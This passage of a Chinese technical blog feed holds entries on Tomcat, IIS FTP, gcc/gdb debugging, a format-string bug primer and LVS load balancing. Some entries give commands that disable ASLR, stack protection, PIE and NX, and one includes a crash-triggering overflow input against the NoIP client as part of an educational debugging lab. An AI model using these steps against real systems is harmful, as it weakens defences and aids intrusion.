</li>
<li><p>配置tomcat环境变量<br><code>vim /etc/profile</code><br>添加如下代码：<br>使之生效<code>source /etc/profile</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export CATALINA_HOME=/opt/tomcat/apache-tomcat-7.0.99</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置utf-8字符集<br>解决中文乱码<br>进入tomcat的conf文件夹，编辑<code>server.xml</code><br>在配置端口的那个位置加入URIEncoding的选项。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Connector port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot;</span><br><span class="line">               connectionTimeout=&quot;20000&quot;</span><br><span class="line">               redirectPort=&quot;8443&quot; URIEncoding=&quot;UTF-8&quot; /&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>测试启动<br>进入bin目录<br>执行<code>./startup.sh</code><br>可以访问到tomcat：<code>localhost:8080</code></p>
</li>
</ol>
<h1 id="0x04-ubuntu16-04下的vsftpd安装"><a href="#0x04-ubuntu16-04下的vsftpd安装" class="headerlink" title="0x04 ubuntu16.04下的vsftpd安装"></a>0x04 ubuntu16.04下的vsftpd安装</h1><p>见单独的页面</p>
<h1 id="0x05-ubuntu16-04下的Ngnix安装"><a href="#0x05-ubuntu16-04下的Ngnix安装" class="headerlink" title="0x05 ubuntu16.04下的Ngnix安装"></a>0x05 ubuntu16.04下的Ngnix安装</h1><p>见单独的页面</p>
<h1 id="0x06-mysql-安装"><a href="#0x06-mysql-安装" class="headerlink" title="0x06 mysql 安装"></a>0x06 mysql 安装</h1><p>见<a href="http://dblab.xmu.edu.cn/blog/install-mysql/" target="_blank" rel="noopener">连接</a>或者本站搜索<br>或者见单独页面</p>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1] <a href="https://blog.csdn.net/u014775723/article/details/85213793" target="_blank" rel="noopener">https://blog.csdn.net/u014775723/article/details/85213793</a></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>语言环境安装配置</tag>
      </tags>
  </entry>
  <entry>
    <title>IISFTP</title>
    <url>/2019/10/24/IISFTP/</url>
    <content><![CDATA[<h1 id="win10搭建ftp服务实践"><a href="#win10搭建ftp服务实践" class="headerlink" title="win10搭建ftp服务实践"></a>win10搭建ftp服务实践</h1><p>win10下面用自带的iis搭建ftp服务用于文件传输</p>
<a id="more"></a>
<h2 id="1-开启IIS服务"><a href="#1-开启IIS服务" class="headerlink" title="1.开启IIS服务"></a>1.开启IIS服务</h2><p><img src="/images/iisftp/01.png" alt="pic"><br><img src="/images/iisftp/02.png" alt="pic"></p>
<h2 id="2-使用搜索功能打开IIS，添加ftp站点"><a href="#2-使用搜索功能打开IIS，添加ftp站点" class="headerlink" title="2.使用搜索功能打开IIS，添加ftp站点"></a>2.使用搜索功能打开IIS，添加ftp站点</h2><p><img src="/images/iisftp/03.png" alt="pic"><br><img src="/images/iisftp/04.png" alt="pic"><br><br>经过上面的步骤在本机上是可以访问到文件的，在局域网或者其它网络的机器是无法访问的。接下来继续配置。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ftp://ip</span><br></pre></td></tr></table></figure>

<h2 id="3-配置防火墙"><a href="#3-配置防火墙" class="headerlink" title="3.配置防火墙"></a>3.配置防火墙</h2><p>一个简单的方法是关闭防火墙，这里配置其他方法不用关闭防火墙。</p>
<h3 id="3-1-放行21端口"><a href="#3-1-放行21端口" class="headerlink" title="3.1 放行21端口"></a>3.1 放行21端口</h3><p><img src="/images/iisftp/05.png" alt="pic"><br>点击高级设置<br><br><img src="/images/iisftp/06.png" alt="pic"><br>入站规则-&gt; 新建规则<br><br><img src="/images/iisftp/07.png" alt="pic"><br>选择端口，下一步<br><br><img src="/images/iisftp/08.png" alt="pic"><br>然后一直下一步。</p>
<h3 id="3-2-设置ftp允许通过防火墙"><a href="#3-2-设置ftp允许通过防火墙" class="headerlink" title="3.2 设置ftp允许通过防火墙"></a>3.2 设置ftp允许通过防火墙</h3><p><img src="/images/iisftp/09.png" alt="pic"><br><img src="/images/iisftp/10.png" alt="pic"><br>然后点击允许其他应用<br><img src="/images/iisftp/11.png" alt="pic"><br>大功告成。</p>
]]></content>
      <categories>
        <category>tool</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>字符串格式化漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>printFormat</title>
    <url>/2019/10/22/printFormat/</url>
    <content><![CDATA[<h1 id="字符串格式漏洞入门案例"><a href="#字符串格式漏洞入门案例" class="headerlink" title="字符串格式漏洞入门案例"></a>字符串格式漏洞入门案例</h1><p>介绍一个格式化字符串漏洞</p>
<a id="more"></a>
<h2 id="1-运行环境"><a href="#1-运行环境" class="headerlink" title="1. 运行环境"></a>1. 运行环境</h2><p>ubuntu16.04<br><br>gcc5.4.0<br><br>gcc-peda</p>
<h2 id="2-准备工作"><a href="#2-准备工作" class="headerlink" title="2. 准备工作"></a>2. 准备工作</h2><ul>
<li>关闭ASLR(地址空间布局随机化)<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>

</li>
</ul>
<blockquote>
<p>地址空间布局随机化：<br>每次加载程序到内存中时，进程地址空间的堆栈起始地址动态变化。用来阻止缓冲区溢出的攻击的<strong>linux内核参数</strong><br><br>0：关闭<br>2：打开</p>
</blockquote>
<ul>
<li>禁用栈保护措施和关闭PIE保护<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -no-pie fmt.c</span><br></pre></td></tr></table></figure>

</li>
</ul>
<blockquote>
<p>PIE:<br><br>PIE全称是position-independent executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，从而不能通过ROPgadget等一些工具来帮助解题[1]</p>
</blockquote>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1] <a href="https://www.anquanke.com/post/id/177520" target="_blank" rel="noopener">https://www.anquanke.com/post/id/177520</a></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>字符串格式化漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>gccAndgdb</title>
    <url>/2019/10/09/gccAndgdb/</url>
    <content><![CDATA[<h1 id="linux下的c编程工具的使用"><a href="#linux下的c编程工具的使用" class="headerlink" title="linux下的c编程工具的使用"></a>linux下的c编程工具的使用</h1><a id="more"></a>
<p>test.c的代码如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;Hello, World\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="1-gcc工具的使用"><a href="#1-gcc工具的使用" class="headerlink" title="1.gcc工具的使用"></a>1.gcc工具的使用</h2><ul>
<li>不带任何参数<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc test.c</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>会在同一个目录下面生成一个<code>a.out</code>文件，输入命令<code>./a.out</code>就可直接运行。</p>
<blockquote>
<p>直接经历了四个步骤：预处理Preprocessing，编译Compilation，汇编Assembly，链接Linking。</p>
</blockquote>
<ul>
<li>指定生成的文件名<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc test.c -o test</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>不会使用默认的a.out。</p>
<ul>
<li><p>gcc保留中间文件<br>gcc编译过程中，会删除中间的文件，可通过下面命令参数来保留各个阶段的文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -save_temps test.c</span><br></pre></td></tr></table></figure>
</li>
<li><p>gcc生成调试信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -g test.c -o test</span><br></pre></td></tr></table></figure>
</li>
<li><p>关闭一些安全手段<br>关闭栈保护和pie，可以加上<code>-g</code>生成一些调试信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ehcho 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">gcc -m32 -fno-stack-protector  -no-pie fmt.c</span><br></pre></td></tr></table></figure>
</li>
<li><p>关闭NX</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -Wall -g -Wl,-zexecstack</span><br></pre></td></tr></table></figure>

</li>
</ul>
<blockquote>
<p>wall：生成所有的警告信息<br>合成一下，关闭一些安全选项</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -Wall -g -m32 -fno-stack-protector  -no-pie -o fmtc fmt.c -Wl,-zexecstack</span><br></pre></td></tr></table></figure>

<ul>
<li>gcc编译生成32bit代码<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -m32 hello.c -o hello</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>如果<code>-m32</code>无法运行，请安装下载相关包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install build-essential module-assistant  </span><br><span class="line">sudo apt-get install gcc-multilib g++-multilib</span><br></pre></td></tr></table></figure>

<ul>
<li>gcc版本信息查看<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -v</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="2-gcc的各个阶段分析"><a href="#2-gcc的各个阶段分析" class="headerlink" title="2.gcc的各个阶段分析"></a>2.gcc的各个阶段分析</h2><h3 id="2-1-预处理"><a href="#2-1-预处理" class="headerlink" title="2.1 预处理"></a>2.1 预处理</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -E test.c -o test.i</span><br></pre></td></tr></table></figure>

<p>功能：主要处理源代码中以 “#” 开始的预编译指令<br>生成文件：<code>test.i</code><br>指定参数: <code>-E</code></p>
<h3 id="2-2-编译"><a href="#2-2-编译" class="headerlink" title="2.2 编译"></a>2.2 编译</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -S test.c -o test.s</span><br><span class="line">#或者</span><br><span class="line">gcc -S test.i -o test.s</span><br></pre></td></tr></table></figure>

<p>输入的文件可以是源文件，也可以是预处理后的文件<br>功能：对预处理完的文件进行一系列<strong>词法分析、语法分析、语义分析</strong>及优化后生成相应的<strong>汇编代码</strong>文件<br>生成文件：<code>test.s</code><br>指定参数：<code>-S</code></p>
<h3 id="2-3-汇编"><a href="#2-3-汇编" class="headerlink" title="2.3 汇编"></a>2.3 汇编</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -c test.c -o test.o</span><br><span class="line">#或者</span><br><span class="line">gcc -c test.s -o test.o</span><br></pre></td></tr></table></figure>

<p>输入的文件可以是源文件，也可以是编译后的文件<br>功能：汇编器将汇编代码转变成机器可以执行的指令<br>生成文件：<code>test.o</code>(<strong>不能直接执行</strong>)<br>指定参数：<code>-c</code></p>
<blockquote>
<p>objdump：一种可阅读的格式让你更多地了解二进制文件（反汇编）</p>
</blockquote>
<p><code>objdump -sd hello.o</code>可查看test.o的信息<br><img src="/images/gccAndgdb/objdump.png" alt="objdump"></p>
<h3 id="2-4-链接"><a href="#2-4-链接" class="headerlink" title="2.4 链接"></a>2.4 链接</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc test.o -o test</span><br></pre></td></tr></table></figure>

<p>输入文件可以是源文件也可以是汇编后的文件<br>指定参数：无<br>生成文件：<code>test</code>(<strong>可以执行</strong>)<br>目标文件需要链接一大堆文件才能得到最终的可执行文件<br>通过以下命令可查看反汇编代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">objdump -d -j .text text</span><br></pre></td></tr></table></figure>

<h2 id="3-gdb的使用"><a href="#3-gdb的使用" class="headerlink" title="3.gdb的使用"></a>3.gdb的使用</h2><p>测试程序如下<code>test.c</code>:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">   int a = 1;</span><br><span class="line">   int b = a;</span><br><span class="line">   printf(&quot;a = %d, b =%d\n&quot;, a, b);</span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>GDB主要帮助你完成下面四个方面的功能：</p>
<ol>
<li>启动你的程序，可以按照你的自定义的要求随心所欲的运行程序。</li>
<li>可让被调试的程序在你所指定的调置的断点处停住。</li>
<li>当程序被停住时，可以检查此时你的程序中所发生的事。</li>
<li>你可以改变你的程序，将一个BUG产生的影响修正从而测试其他BUG。<h3 id="3-1-gbd调试程序的简易入门操作"><a href="#3-1-gbd调试程序的简易入门操作" class="headerlink" title="3.1 gbd调试程序的简易入门操作"></a>3.1 gbd调试程序的简易入门操作</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install gdb</span><br></pre></td></tr></table></figure>
</li>
</ol>
<ul>
<li>启动调试<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#编译文件，加上调试信息。不加参数-g可能无法调试</span><br><span class="line">gcc -g test.c -o test</span><br><span class="line">#开始启动调试</span><br><span class="line">gdb test</span><br></pre></td></tr></table></figure>

</li>
</ul>
<blockquote>
<p>拓展: 启动调试的时候输入<code>gdb -tui test</code>会有一个漂亮的交互窗口</p>
</blockquote>
<ul>
<li>调试的操作</li>
<li><em>注意*</em>  :括号内的东西不用输入</li>
</ul>
<h4 id="显示当前的代码"><a href="#显示当前的代码" class="headerlink" title="显示当前的代码"></a>显示当前的代码</h4><p>一次10行，继续输入<code>l</code>继续显示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) l</span><br></pre></td></tr></table></figure>

<h4 id="单步"><a href="#单步" class="headerlink" title="单步"></a>单步</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) start</span><br></pre></td></tr></table></figure>

<p>这个时候会进入程序运行状态，单步运行需要输入<code>n</code>，输入一次执行一条语句。<code>s</code>单步会进入子程序中去。</p>
<h4 id="跳出函数fin"><a href="#跳出函数fin" class="headerlink" title="跳出函数fin"></a>跳出函数fin</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) finish</span><br><span class="line">#或者</span><br><span class="line">(gdb) fin</span><br></pre></td></tr></table></figure>

<h4 id="断点-单步"><a href="#断点-单步" class="headerlink" title="断点+单步"></a>断点+单步</h4><p>启动的时候<code>start</code>程序会在第一行停止。<br>这个时候可以设置断点，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) b 5</span><br><span class="line">(gdb) c #运行程序到断点处，一般在设置完断点后使用</span><br><span class="line">(gdb) r #重新运行程序 run</span><br></pre></td></tr></table></figure>

<blockquote>
<p>表示在第5行设置断点，输入命令<code>c</code>会直接运行到第5行；其中b后面的参数也可以是一个函数名。可以按照单步的方法继续运行。<br>可以同时设置多个断点</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) display b</span><br></pre></td></tr></table></figure>

<p>这个display 可以查看变量的值</p>
<h4 id="查看所有断点和删除"><a href="#查看所有断点和删除" class="headerlink" title="查看所有断点和删除"></a>查看所有断点和删除</h4><p>查看已经设置的断点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) info breakpoints</span><br><span class="line">#可以简写成</span><br><span class="line">(gdb) i b</span><br></pre></td></tr></table></figure>

<p><img src="/images/gccAndgdb/gdbInfo.png" alt="gdbInfo"><br>注意到每一个断点有编号，使用编号可删除断点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) delete 2</span><br></pre></td></tr></table></figure>

<h4 id="设置条件断点"><a href="#设置条件断点" class="headerlink" title="设置条件断点"></a>设置条件断点</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) b 5 if a == 2</span><br></pre></td></tr></table></figure>

<h4 id="观察变量改变的地方"><a href="#观察变量改变的地方" class="headerlink" title="观察变量改变的地方"></a>观察变量改变的地方</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) watch b</span><br><span class="line">(gdb) c</span><br></pre></td></tr></table></figure>

<p>变量内存值被修改的时候会展示出来</p>
<h4 id="反汇编命令"><a href="#反汇编命令" class="headerlink" title="反汇编命令"></a>反汇编命令</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) disassemble main</span><br><span class="line">#可简写成</span><br><span class="line">(gdb) disas main</span><br></pre></td></tr></table></figure>

<p>其中的main是一个函数名称。</p>
<h4 id="查看内存"><a href="#查看内存" class="headerlink" title="查看内存"></a>查看内存</h4><p>格式<code>x/nfu &lt;addr&gt;</code>或者<code>x &lt;addr&gt;</code></p>
<blockquote>
<p>n—-指定显示多少单位的内存值，这个单位由<code>u</code>指定<br>f—–显示的格式，与<code>printf</code>格式相同，默认是<code>x</code>表示十六进制，可选的有<code>d</code>,<code>u</code>,<code>s</code>,<code>i</code>….<br>u——单位大小，b(字节)，h(双字节)，w(四字节)，g(八字节)<br>eg</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) x/10x $esp</span><br><span class="line">(gdb) x/100i $0xdddddd  以指令的形式查看内存区域</span><br></pre></td></tr></table></figure>

<h4 id="修改寄存器的值"><a href="#修改寄存器的值" class="headerlink" title="修改寄存器的值"></a>修改寄存器的值</h4><p>使用<code>set</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) set $eax=0</span><br></pre></td></tr></table></figure>

<p>可以使用<code>i r</code>查看你所有寄存器的值</p>
<h3 id="3-2-gdb插件—gdb-peda"><a href="#3-2-gdb插件—gdb-peda" class="headerlink" title="3.2 gdb插件—gdb-peda"></a>3.2 gdb插件—gdb-peda</h3><p>PEDA(<strong>Python Exploit Development Assistance for GDB</strong>)是一个强大的 gdb 插件。它提供了高亮显示反汇编代码、寄存器、内存信息等人性化的功能。同时，PEDA 还有一些实用的新命令，比如checksec 可以查看程序开启了哪些安全机制等等。</p>
<ul>
<li>安装<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">$ echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="4-Linux代码执行漏洞分析实战"><a href="#4-Linux代码执行漏洞分析实战" class="headerlink" title="4. Linux代码执行漏洞分析实战"></a>4. Linux代码执行漏洞分析实战</h2><p>主要工作：出发一个NoIP本地运行的栈溢出漏洞，用gdb调试工具找出漏洞发生的地点。</p>
<h3 id="4-1-准备"><a href="#4-1-准备" class="headerlink" title="4.1 准备"></a>4.1 准备</h3><p>NoIP本地栈溢出漏洞</p>
<ul>
<li><p>step1 注册NO-IP账号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://my.noip.com/#!/account</span><br><span class="line">https://www.noip.com</span><br></pre></td></tr></table></figure>
</li>
<li><p>step2 在Linux下安装No-ip<br><a href="https://www.noip.com/support/knowledgebase/installing-the-linux-dynamic-update-client/" target="_blank" rel="noopener">官网</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd /usr/local/src</span><br><span class="line">wget http://www.no-ip.com/client/linux/noip-duc-linux.tar.gz</span><br><span class="line">tar xzf noip-duc-linux.tar.gz</span><br><span class="line">cd no-ip-2.1.9</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
</li>
<li><p>由PoC出发漏洞</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb noip2</span><br><span class="line">run -i $(python -c &apos;print (&quot;\x41&quot;*500)&apos;)</span><br></pre></td></tr></table></figure>

</li>
</ul>
<blockquote>
<p>如果没有触发漏洞，将数值可以加大为1000，直到有漏洞触发</p>
</blockquote>
<p><img src="/images/gccAndgdb/noipPoc.png" alt="图片"><br>图1</p>
<ul>
<li>使用静态反汇编工具idaPro<br>win系统下远程连接linux编译文件调试参考文献<a href="#r01">1</a></li>
</ul>
<h3 id="4-2实验过程"><a href="#4-2实验过程" class="headerlink" title="4.2实验过程"></a>4.2实验过程</h3><p>由图1可知，漏洞发生之前，打印输出了字符串<code>IP address detected on command line.</code>我们先定位到这个字符串输出的位置。</p>
<ul>
<li>step1: IDAPro远程连接到Noip程序<br>打开搜索框，输入上面的那个字符串进行搜索。<br><img src="/images/gccAndgdb/findIPString.png" alt="pic"><blockquote>
<p>可以看到这里有一个mov操作，之后调用了<code>call Msg</code>。</p>
</blockquote>
</li>
</ul>
<p>因此我们在这个地点下一个断点，红色框框对应的地址()。</p>
<ul>
<li>step2: 切换回linux，设置断点<br>退出之前的gdb, <code>quit</code><br>重新进入<code>gdb noip2</code><br>通过第一步得到的地址设置断点<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">b *0x00000000004021AB</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p><img src="/images/gccAndgdb/bAddress.png" alt="pic"><br>可观察到在源码中对应的行数为line 607</p>
<ul>
<li>step3: 执行得到漏洞的命令<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run -i $(python -c &apos;print (&quot;\x41&quot;*1000)&apos;)</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p><img src="/images/gccAndgdb/againRun1.png" alt="pic"><br>可以看到在<code>0x4021ab</code>处发生了中断，即我们设置的断点的地方。</p>
<ul>
<li>step4: 单步执行<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ni</span><br><span class="line">#或者</span><br><span class="line">n</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>在这个过程中，可以看到运行到了<code>call Msg</code>，并且打印出了字符串<br><img src="/images/gccAndgdb/callMsg.png" alt="pic"><br>继续单步执行，可以看到输出另一串<code>Running in single use mode.</code><br>如果之前进行了<code>push</code>操作，可以使用命令这可以查看栈顶的的值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) x/10x $esp</span><br><span class="line"># 查看内存的值</span><br><span class="line">(gdb) x/10x 0x4083b5(视情况)</span><br><span class="line">(gdb) x/100x 0x4083b5</span><br><span class="line"># 也可以以字符串形式输出内存的值</span><br><span class="line">(gdb) x/10s 0x4083b5</span><br></pre></td></tr></table></figure>

<p><img src="/images/gccAndgdb/xsStr.png" alt="pic"></p>
<ul>
<li>step5 继续单步，一直到出现漏洞<br><img src="/images/gccAndgdb/findError.png" alt="pic"></li>
</ul>
<p>可以发现，当程序调用<code>dynamic_update</code>的前中后出现了问题。<strong>有可能是在这个函数里面出现问题，也有可能是该函数嵌套的函数出现了问题。</strong><br>得到调用<code>dynamic_update</code>函数的地址为：<code>0x40233c</code></p>
<ul>
<li><p>step6: 重新设置断点<br>切换回IDAPro，以此选择<code>jump</code>-&gt;<code>jump address</code>输入上面得到的函数地址。切换到<code>graph view</code>按住<strong>F5</strong>可查看c伪代码。<br>找到调用<code>dynamic_update</code>函数之前的一个地址<code>0x402337</code>，重新设置断点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) b *0x0x402337</span><br><span class="line">(gdb) run -i $(python -c &apos;print (&quot;\x41&quot;*1000)&apos;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>step7 进入到函数内部<br>这里使用<code>si</code>或者<code>s</code>进行单步。<br>进入到<code>dynamic_update</code>函数后，使用<code>n</code>来单步，确定程序崩溃的地方。</p>
</li>
</ul>
<p>[1] <span id="r01"><a href="https://blog.csdn.net/lacoucou/article/details/71079552" target="_blank" rel="noopener">https://blog.csdn.net/lacoucou/article/details/71079552</a></span> windows下使用IDA远程调试linux(ubuntu)下编译的程序</p>
]]></content>
      <categories>
        <category>tool</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>gcc</tag>
      </tags>
  </entry>
  <entry>
    <title>balanceLvs</title>
    <url>/2019/10/08/balanceLvs/</url>
    <content><![CDATA[<h1 id="负载均衡之lvs"><a href="#负载均衡之lvs" class="headerlink" title="负载均衡之lvs"></a>负载均衡之lvs</h1><p><a href="http://www.linuxvirtualserver.org/zh/index.html" target="_blank" rel="noopener">官方文档</a></p>
<a id="more"></a>
<h2 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1.基础知识"></a>1.基础知识</h2><h3 id="1-1-linux命令"><a href="#1-1-linux命令" class="headerlink" title="1.1 linux命令"></a>1.1 linux命令</h3><ul>
<li><p><code>route</code> 查看本机的路由表<br><img src="/images/balanceLvs/route.png" alt="route"></p>
<blockquote>
<p>-n 不带地址转换，IP显示<code>route -n</code></p>
</blockquote>
</li>
<li><p><code>netstat -natp</code> 查看本机的TCP链接程序<br><img src="/images/balanceLvs/netstat.png" alt="netstat"></p>
<blockquote>
<p>-n 不进行转换，全以IP地址显示<br>-a 是所有的链接<br>-t tcp链接</p>
</blockquote>
</li>
<li><p><code>arp -a</code>查看MAC地址表</p>
<h3 id="1-2-一些名称"><a href="#1-2-一些名称" class="headerlink" title="1.2 一些名称"></a>1.2 一些名称</h3><table>
<thead>
<tr>
<th align="center">全称</th>
<th align="center">缩写</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">虚拟IP地址Virtual IP address</td>
<td align="center">VIP</td>
<td align="center">提供服务的IP地址,如<a href="http://www.baidu.com通过DNS得到的地址" target="_blank" rel="noopener">www.baidu.com通过DNS得到的地址</a></td>
</tr>
<tr>
<td align="center">转发的网络地址Director IP address</td>
<td align="center">DIP</td>
<td align="center">负载均衡器上面的IP</td>
</tr>
<tr>
<td align="center">真实IP地址Real IP address</td>
<td align="center">RIP</td>
<td align="center">后端集群主机</td>
</tr>
<tr>
<td align="center">客户端地址IP Client IP address</td>
<td align="center">CIP</td>
<td align="center">源IP地址</td>
</tr>
</tbody></table>
</li>
</ul>
<p>lvs负载均衡的拓扑结构<br><img src="/images/balanceLvs/topuGraph1.png" alt="tupu"></p>
<blockquote>
<p>说明</p>
<ol>
<li>负载均衡器工作在网络层，只转发数据包，不进行握手连接</li>
<li>要保证同一个客户端三次握手，四次分手不可分割，即转发到同一个服务器镜像</li>
<li>后端的真实服务器都是镜像，一模一样的。</li>
</ol>
</blockquote>
<h3 id="1-3-模型概述"><a href="#1-3-模型概述" class="headerlink" title="1.3 模型概述"></a>1.3 模型概述</h3><h4 id="1-3-1-D-NAT与S-NAT"><a href="#1-3-1-D-NAT与S-NAT" class="headerlink" title="1.3.1 D_NAT与S_NAT"></a>1.3.1 D_NAT与S_NAT</h4><p>客户端请求的数据包源地址和目的地址<code>CIP-VIP</code><br>当其到达负载均衡器入口时，如果不对该数据包做处理就转发，那么RealServer看到的目的IP地址就是VIP，不属于RealServer的IP,不会做出回应。<br><strong>因此在负载均衡器中需要对数据包中的目的地址进行转换</strong><br>修改目的地址(<strong>D_NAT技术</strong>)，数据包变为<code>CIP-RIP</code>,这个时候RealServer可处理该数据包</p>
<blockquote>
<p><strong>问题</strong> 此时RealServer建立的Sockt连接是：<code>RIP:Port---CIP:Port</code>,所以响应包的源地址和目的地址是：<code>RIP-CIP</code>。当这个数据包达到客户端的时候，与客户端发的请求包中的地址不对应了？</p>
</blockquote>
<p>因此，负载均衡器还需要负责将响应包的源地址修改为VIP(<strong>S_NAT技术</strong>)。<br>为了实现这个，RealServer的默认网关(default/0.0.0.0)需要指向LVS负载均衡器。</p>
<blockquote>
<p>缺点：所有数据(上行，下行)都要经过LVS，I/O瓶颈在这里会产生。<br>可行方案： 每一个RealServer不要将响应数据发给LVS,直接将响应包发给客户端。</p>
</blockquote>
<h4 id="1-3-2-DR模型"><a href="#1-3-2-DR模型" class="headerlink" title="1.3.2 DR模型"></a>1.3.2 DR模型</h4><blockquote>
<p>让RealServer拥有一个VIP这样的IP地址，但是不暴露在公网，自己有一个隐藏的VIP地址</p>
</blockquote>
<p>客户端发送<code>CIP-VIP</code>数据包，经过LVS到达RealServer,因为RealServre有一个隐藏的VIP地址，所以会接收该数据包，然后将响应包<code>VIP-CIP</code>直接发送给客户端，不用通过lvs负载均衡器。</p>
<ul>
<li>问题： 客户端的数据包是<code>CIP-VIP</code>，RealServer暴露的IP是RIP，lvs如何将客户端数据包发给RealServer。<blockquote>
<p>解答： 通过arp欺骗。lvs与RealServer必须在同一个局域网内</p>
</blockquote>
</li>
</ul>
<p><strong>缺点</strong> :要求lvs与RealServer在同一个局域网内，对分布在地理位置不同的数据中心无法做负载均衡。</p>
<h4 id="1-3-3-Tunnel与VPN模型"><a href="#1-3-3-Tunnel与VPN模型" class="headerlink" title="1.3.3 Tunnel与VPN模型"></a>1.3.3 Tunnel与VPN模型</h4><p>客户端发出数据包<code>CIP-VIP</code>。数据包到达lvs的时候，建立一个新的请求，发送数据包<code>DIP-RIP</code>,这个数据包会将客户端的所有数据都封装起来。然后通过公网到RealServer。<br>RealServer会拆包，得到里面的<code>CIP-VIP</code>请求。自己有隐藏的VIP地址。</p>
<h3 id="1-4-linux隐藏IP的方法"><a href="#1-4-linux隐藏IP的方法" class="headerlink" title="1.4 linux隐藏IP的方法"></a>1.4 linux隐藏IP的方法</h3><p>对内可见，对外隐藏。<br><strong>需要隐藏的IP配置到外部无法访问的网卡上</strong>就是lo网卡，环回接口<br>注意：一个网卡可以添加多个IP地址，所以环回地址127.0.0.1不受影响。</p>
<blockquote>
